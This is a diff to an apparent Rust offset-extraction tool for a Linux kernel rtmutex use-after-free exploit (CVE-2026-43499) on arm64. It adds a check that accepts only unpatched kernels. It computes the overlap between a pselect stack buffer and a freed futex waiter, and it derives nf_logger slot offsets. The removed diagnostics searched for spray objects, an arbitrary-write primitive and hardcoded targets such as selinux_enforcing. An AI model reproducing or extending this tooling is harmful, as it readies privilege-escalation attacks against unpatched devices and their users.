@@ -61,6 +61,64 @@ fn disassemble_symbol(
     disassemble_range(kernel, start, stop)
 }
 
+/// reject kernels that include the rtmutex
+/// remove_waiter() fix before offset extraction.
+pub fn ensure_rtmutex_43499_unpatched(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+) -> Result<u64> {
+    let start = unique_offset_optional(symbols, "remove_waiter")
+        .ok_or_else(|| ExtractError::new("cannot check: remove_waiter is not in kallsyms"))?;
+    let cap = OBJDUMP_CAP as u64;
+    let stop = (start + cap).min(
+        sorted_offsets
+            .iter()
+            .find(|off| **off > start)
+            .map_or(start + cap, |off| *off),
+    );
+    let dis = disassemble_range(kernel, start as usize, stop as usize)?;
+    if remove_waiter_uses_current(&dis) {
+        return Ok(start);
+    }
+    Err(ExtractError::already_fixed(format!(
+        "remove_waiter()@{start:#x} never reads current (no mrs sp_el0); \
+         rtmutex UAF fix is present"
+    )))
+}
+
+/// True when `remove_waiter()` still operates on `current` (vulnerable):
+/// the fixed variant no longer contains `mrs xN, sp_el0`.
+pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
+    let mrs_current = Regex::new(r"(?i)\bmrs\s+x\d+,\s*s3_0_c4_c1_0\b").unwrap();
+    dis.iter().any(|line| mrs_current.is_match(line))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::remove_waiter_uses_current;
+
+    #[test]
+    fn patched_remove_waiter_never_reads_current() {
+        let dis = vec![
+            "0106f91c: ldr x20, [x23, #0x50]".to_string(),
+            "0106f964: str xzr, [x20, #0x938]".to_string(),
+            "0106fae8: mov x5, x20".to_string(),
+        ];
+        assert!(!remove_waiter_uses_current(&dis));
+    }
+
+    #[test]
+    fn vulnerable_remove_waiter_reads_current() {
+        let dis = vec![
+            "01068de0: mrs x20, s3_0_c4_c1_0".to_string(),
+            "01068e2c: mov x0, x21".to_string(),
+            "01068e30: str xzr, [x20, #0x938]".to_string(),
+        ];
+        assert!(remove_waiter_uses_current(&dis));
+    }
+}
+
 pub struct PselectLayout {
     pub shift: u64,
     pub waiter_local: u64,
@@ -88,49 +146,6 @@ pub fn derive_pselect_layout(
     ];
     if unique_offset_optional(symbols, "do_pselect").is_some() {
         names.push(("pselect_dispatch", "do_pselect"));
-    }
-    // Probe alternate STACK-based (not heap) user-copy primitives for 5.x.
-    // The CVE-2026-43499 primitive needs a user-controlled buffer on the
-    // KERNEL STACK that lands on the futex waiter.  Heap objects (epitem,
-    // io_uring sqe/cqe) cannot overlap a stack waiter.  Only syscalls that
-    // copy user data into a stack frame are candidates.  Report their frame
-    // depth so we can see which one puts its buffer at the waiter depth.
-    for alt in [
-        "___sys_sendmsg", "__sys_sendmsg", "do_sendmsg", "sys_sendmsg",
-        "___sys_recvmsg", "__sys_recvmsg", "do_recvmsg",
-        "____sys_recvmsg", "__sys_recvfrom", "do_recvfrom",
-        "do_writev", "do_readv", "___sys_writev", "___sys_readv",
-        "do_sys_epoll_wait", "ep_poll", "do_sys_epoll_ctl",
-    ] {
-        if let Some(off) = unique_offset_optional(symbols, alt) {
-            let higher = sorted_offsets.iter().find(|o| **o > off);
-            let stop = (off as usize + 0x800).min(higher.map_or(off as usize + 0x800, |o| *o as usize));
-            if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
-                let frame = first_sp_frame(&lines, alt).unwrap_or(0);
-                eprintln!("stackbuf {alt} frame={frame:#x}");
-            }
-        }
-    }
-    // The futex waiter depth on 5.15 is -(0xa0+0x140+0x1b0)+0x98 = -0x2f8.
-    // For a stack-copy primitive to overlap it, the sum of the wrapper frames
-    // above the user-copy buffer must be ~0x2f8.  Print the sendmsg chain
-    // (__arm64_sys_sendmsg -> ___sys_sendmsg) partial sums and the iovec copy
-    // sites (import_iovec / rw_copy_check_user) so we can see if a freed
-    // waiter frame can be reclaimed there.
-    for alt in ["__arm64_sys_sendmsg", "__arm64_sys_recvmsg", "__arm64_sys_sendto",
-                "___sys_sendmsg", "sendmsg_copy_msghdr", "sendmsg_copy_msghdr_from_user",
-                "___sys_sendmsg"] {
-        if let Some(off) = unique_offset_optional(symbols, alt) {
-            let higher = sorted_offsets.iter().find(|o| **o > off);
-            let stop = (off as usize + 0x800).min(higher.map_or(off as usize + 0x800, |o| *o as usize));
-            if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
-                let frame = first_sp_frame(&lines, alt).unwrap_or(0);
-                let calls: Vec<String> = lines.iter()
-                    .filter(|l| l.trim_start().starts_with("bl "))
-                    .take(4).map(|l| l.trim().to_string()).collect();
-                eprintln!("chain {alt} frame={frame:#x} calls=[{}]", calls.join(", "));
-            }
-        }
     }
 
     let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
@@ -208,224 +223,31 @@ pub fn derive_pselect_layout(
         frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
     }
 
-    // 6.x kernels name these fields tree/pi_tree; 5.x kernels (pre-6.4) name
-    // them tree_entry/pi_tree_entry.  Accept both so the waiter-local
-    // derivation works across the two layout families.
+    // 6.6 names the rb_nodes tree/pi_tree; 6.1 calls them
+    // tree_entry/pi_tree_entry (same offsets in the struct).
     let pi_tree = btf
         .field("rt_mutex_waiter", "pi_tree")
         .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
-    let wake_state = btf
-        .field("rt_mutex_waiter", "wake_state");
+    let wake_state = btf.field("rt_mutex_waiter", "wake_state");
     if pi_tree.is_none() || wake_state.is_none() {
-        if let Some(item) = btf.named_struct("rt_mutex_waiter") {
-            let members: Vec<String> = item
-                .members
-                .iter()
-                .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
-                .collect();
-            eprintln!(
-                "error: BTF rt_mutex_waiter has no pi_tree/pi_tree_entry or wake_state; \
-                 members=[{}]",
-                members.join(" ")
-            );
-        }
         return Err(ExtractError::new(
-            "BTF rt_mutex_waiter.pi_tree/pi_tree_entry or wake_state missing",
+            "BTF rt_mutex_waiter.pi_tree/wake_state missing",
         ));
     }
     let pi_tree = pi_tree.unwrap() as u64;
     let wake_state = wake_state.unwrap() as u64;
 
-    // Diagnostic: dump the real rt_mutex_waiter layout so we can confirm the
-    // PI-chain primitive type (rb_node pi_tree vs plist_node pi_tree_entry).
-    if let Some(item) = btf.named_struct("rt_mutex_waiter") {
-        let members: Vec<String> = item
-            .members
-            .iter()
-            .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
-            .collect();
-        let has_pi_tree = btf.field("rt_mutex_waiter", "pi_tree").is_some();
-        let has_pi_tree_entry = btf.field("rt_mutex_waiter", "pi_tree_entry").is_some();
-        eprintln!(
-            "diag: rt_mutex_waiter pi_tree={has_pi_tree} pi_tree_entry={has_pi_tree_entry} \
-             pi_tree_off={pi_tree:#x} wake_state_off={wake_state:#x} members=[{}]",
-            members.join(" ")
-        );
-    }
-
-    // Diagnostic: find which kernel symbol contains fake_lock=0xD65BD8 and
-    // scratch=0xD92E38 (the reference's fake-waiter lock/value bases).  This
-    // tells us the blob lock offset (+0x40/+0x80) and confirms the lock is a
-    // static kernel object, not a dynamic pi_state.
-    for (label, addr) in [
-        ("fake_lock", 0xD65BD8u64),
-        ("scratch", 0xD92E38u64),
-        ("fake_lock+0x40", 0xD65C18u64),
-        ("fake_lock+0x80", 0xD65C58u64),
-        /* reference target profile offsets (low 32 from .data.rel.ro) */
-        ("P1_task", 0x2AC33580u64),
-        ("P1_38", 0x2ABED628u64),
-        ("P1_lock", 0x2AD44BD8u64),
-        ("P1_rbleft", 0x2AD99CF0u64),
-        ("P1_scratch", 0x2AD71E38u64),
-        ("P2_task", 0x2AC53440u64),
-        ("P2_lock", 0x2AD65BD8u64),
-        ("P2_rbleft", 0x2ADDAB88u64),
-        ("P2_scratch", 0x2AD92E38u64),
-        ("selinux_enforcing", 0x2DBAD88u64),
-    ] {
-        let mut best: Option<(u64, String)> = None;
-        for (name, offs) in symbols {
-            for &o in offs {
-                if o <= addr && best.as_ref().map_or(true, |(bo, _)| o > *bo) {
-                    best = Some((o, name.clone()));
-                }
-            }
-        }
-        if let Some((o, name)) = best {
-            eprintln!("diag: {label} 0x{addr:x} in symbol {name} @ 0x{o:x} (+0x{:x})",
-                      addr - o);
-        } else {
-            eprintln!("diag: {label} 0x{addr:x} NO containing symbol");
-        }
-    }
-
-    // Diagnostic: dump the IPv6 multicast heap objects that the reference
-    // 5.15 write primitive sprays as the fake plist node carrier.
-    // First, find the kernel linux_banner so we can pin the exact release.
-    if let Some(idx) = kernel.windows(16).position(|w| w == b"Linux version 5") {
-        let start = idx;
-        let end = kernel[start..]
-            .iter()
-            .position(|b| *b == 0)
-            .map(|d| start + d)
-            .unwrap_or(kernel.len());
-        eprintln!(
-            "diag: linux_banner offset=0x{start:x} = {}",
-            String::from_utf8_lossy(&kernel[start..end])
-        );
-    } else {
-        eprintln!("diag: linux_banner 'Linux version 5' NOT FOUND");
-    }
-    for struct_name in [
-        "ipv6_mc_socklist",
-        "ipv6_mc_list",
-        "ip6_mc_list",
-        "ip6_sf_list",
-        "ip6_sf_socklist",
-        "plist_node",
-        "list_head",
-        "selinux_state",
-    ] {
-        if let Some(item) = btf.named_struct(struct_name) {
-            let members: Vec<String> = item
-                .members
-                .iter()
-                .map(|m| format!("{}@{:#x}", m.name, m.bit_offset / 8))
-                .collect();
-            eprintln!("diag: {struct_name} sizeof={:#x} members=[{}]", item.size_or_type, members.join(" "));
-        } else {
-            eprintln!("diag: {struct_name} NOT FOUND in BTF");
-        }
-    }
-
-    // Diagnostic: disassemble the plist / rt_mutex PI-chain functions to lock
-    // down the 5.15 write direction (which list_head write is used).
-    for fname in [
-        "__plist_del", "plist_del", "__plist_add", "plist_add",
-        "plist_rotate", "__plist_rotate", "plist_set_prio",
-        "rt_mutex_adjust_prio_chain", "__rt_mutex_adjust_prio_chain",
-        "rt_mutex_enqueue", "rt_mutex_enqueue_pi",
-        "rt_mutex_waiter_remove", "remove_waiter",
-        // Internal helpers remove_waiter() calls; the 5.15 write primitive
-        // (plist_del / __list_del) is what actually performs [prev]=next.
-        "rt_mutex_waiter_remove_helper",
-    ] {
-        let Some(off) = unique_offset_optional(symbols, fname) else {
-            eprintln!("diag: {fname} NOT FOUND");
-            continue;
-        };
-        let higher = sorted_offsets.iter().find(|o| **o > off).copied();
-        let cap = 0x600;
-        let stop = (off as usize + cap).min(higher.map_or(off as usize + cap, |o| o as usize));
-        if let Ok(lines) = disassemble_range(kernel, off as usize, stop) {
-            eprintln!("diag: ---- {fname} @ {off:#x} ----");
-            for line in lines {
-                eprintln!("  {line}");
-            }
-        }
-    }
-
-    // Diagnostic: brute disassemble the leaf helpers remove_waiter() calls
-    // (0xa5bffc / 0xa5c25c / 0xa5c08c / 0xa5ba4 / 0x9e5c78) to confirm which
-    // list_head write is the real arbitrary-write primitive on 5.15.
-    for (hname, off) in [
-        ("remove_waiter_bl_a5bffc", 0xa5bffcusize),
-        ("remove_waiter_bl_a5c25c", 0xa5c25cusize),
-        ("remove_waiter_bl_a5c08c", 0xa5c08cusize),
-        ("remove_waiter_bl_a5ba4", 0xa5ba4usize),
-        ("remove_waiter_bl_9e5c78", 0x9e5c78usize),
-    ] {
-        let cap = 0x300;
-        let stop = off + cap;
-        if off + cap <= kernel.len() {
-            if let Ok(lines) = disassemble_range(kernel, off, stop) {
-                eprintln!("diag: ---- {hname} @ {off:#x} ----");
-                for line in lines {
-                    eprintln!("  {line}");
-                }
-            }
-        }
-    }
-
-    // Diagnostic: disassemble do_ipv6_setsockopt to find the optname-46
-    // handler that the reference 5.15 spray uses to reclaim the fake node.
-    for (fname, off) in [
-        ("do_ipv6_setsockopt", 0x153c86cusize),
-        ("ipv6_setsockopt", 0x153c74cusize),
-        ("ipv6_sock_mc_join", 0x1553480usize),
-        ("ipv6_sock_mc_join_ssm", 0x1556c2cusize),
-        ("ip6_mc_msfilter", 0x1557d8cusize),
-        ("opt46_processing", 0x153d5a0usize),
-        ("opt46_copy_user", 0x153d994usize),
-    ] {
-        let cap = 0x800;
-        let stop = off + cap;
-        if off + cap <= kernel.len() {
-            if let Ok(lines) = disassemble_range(kernel, off, stop) {
-                eprintln!("diag: ---- {fname} @ {off:#x} (from on-device kallsyms) ----");
-                for line in lines {
-                    eprintln!("  {line}");
-                }
-            }
-        }
-    }
-
-    // Dump the optname jump table so we can confirm which optname maps to the
-    // 264-byte handler.  Table at 0x1f51d2c, base = 0x153c98c.
-    let table = 0x1f51d2cusize;
-    if table + 256 <= kernel.len() {
-        eprintln!("diag: optname jump table @ {table:#x}:");
-        for idx in 0..64usize {
-            let off = table + idx * 4;
-            let val = u32::from_le_bytes(
-                kernel[off..off + 4].try_into().unwrap());
-            eprintln!("  optname={} (idx {idx:#x}) disp={val} -> target={:#x}",
-                      idx + 1, 0x153c98cusize.wrapping_add(val as usize));
-        }
-    }
-
     let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
     for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
         if pi_tree != 0 {
-            let re = Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b"))
-                .unwrap();
+            let re =
+                Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b")).unwrap();
             if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                 waiter_candidates.push((reg, imm));
             }
         } else {
-            let re = Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]"))
-                .unwrap();
+            let re =
+                Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]")).unwrap();
             if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                 waiter_candidates.push((reg, imm));
             }
@@ -434,36 +256,6 @@ pub fn derive_pselect_layout(
     // Several registers may materialize the same sp local; dedupe by offset.
     let mut seen = BTreeSet::new();
     waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
-    // wake_state is a 4-byte int; the real on-stack rt_mutex_waiter has a
-    // 32-bit store (str w..) at [sp, #waiter+wake_state].  A 64/128-bit
-    // stp/ldp there means the local is some other struct.  Prefer the
-    // candidate whose wake_state slot is written by a narrow store.
-    if waiter_candidates.len() > 1 && wake_state != 0 {
-        let narrow = Regex::new(r"(?i)\bstr\s+w\d+,\s*\[sp,").unwrap();
-        let wide = Regex::new(r"(?i)\b(stp|ldp)\s+x\d+").unwrap();
-        let mut scored: Vec<(&(String, u64), bool)> = waiter_candidates
-            .iter()
-            .map(|cand| {
-                let ws = cand.1 + wake_state;
-                let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{ws:x}\]")).unwrap();
-                let narrow_hit = dis["futex_wait"]
-                    .iter()
-                    .any(|line| re.is_match(line) && narrow.is_match(line));
-                let wide_hit = dis["futex_wait"]
-                    .iter()
-                    .any(|line| re.is_match(line) && wide.is_match(line));
-                (cand, narrow_hit || !wide_hit)
-            })
-            .collect();
-        let winners: Vec<&(String, u64)> = scored
-            .iter()
-            .filter(|(_, ok)| *ok)
-            .map(|(cand, _)| *cand)
-            .collect();
-        if winners.len() == 1 {
-            waiter_candidates = winners.into_iter().cloned().collect();
-        }
-    }
     if waiter_candidates.len() != 1 {
         return Err(ExtractError::new(format!(
             "futex waiter stack local not unique: {waiter_candidates:?}"
@@ -510,7 +302,10 @@ pub fn derive_pselect_layout(
         }
     }
     if buffer_candidates.len() != 1 {
-        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
+        let hex: Vec<String> = buffer_candidates
+            .iter()
+            .map(|v| format!("{v:#x}"))
+            .collect();
         return Err(ExtractError::new(format!(
             "core_sys_select fd_set buffer candidates not unique: {hex:?}"
         )));
@@ -551,9 +346,15 @@ pub fn derive_pselect_layout(
         )));
     }
 
-    let frame_sum: u64 = pselect_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
+    let frame_sum: u64 = pselect_chain
+        .iter()
+        .map(|key| frames[&format!("frame_{key}")])
+        .sum();
     let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
-    let futex_sum: u64 = futex_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
+    let futex_sum: u64 = futex_chain
+        .iter()
+        .map(|key| frames[&format!("frame_{key}")])
+        .sum();
     let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
     let delta = futex_waiter - pselect_word0;
     if delta < 0 || delta % 8 != 0 {
@@ -638,9 +439,7 @@ pub fn derive_nf_logger_registration(
         .field("nf_logger", "type")
         .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
     if btf.direct_field_size("nf_logger", "type") != Some(4) {
-        return Err(ExtractError::new(
-            "BTF nf_logger.type is not a 4-byte enum",
-        ));
+        return Err(ExtractError::new("BTF nf_logger.type is not a 4-byte enum"));
     }
     let logger_type = u32_at(kernel, logger + type_off as u64)?;
     let ulog_value = btf
@@ -727,17 +526,13 @@ pub fn derive_nf_logger_registration(
         )));
     }
     let (slot_reg, _) = &deduped[0];
-    let stlr_re = Regex::new(&format!(
-        r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]"
-    ))
-    .unwrap();
+    let stlr_re = Regex::new(&format!(r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]")).unwrap();
     if !register_text.iter().any(|line| stlr_re.is_match(line)) {
         return Err(ExtractError::new(
             "nf_log_register does not store the logger to the slot",
         ));
     }
-    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b"))
-        .unwrap();
+    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b")).unwrap();
     if !register_text.iter().any(|line| bound_re.is_match(line)) {
         return Err(ExtractError::new(
             "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
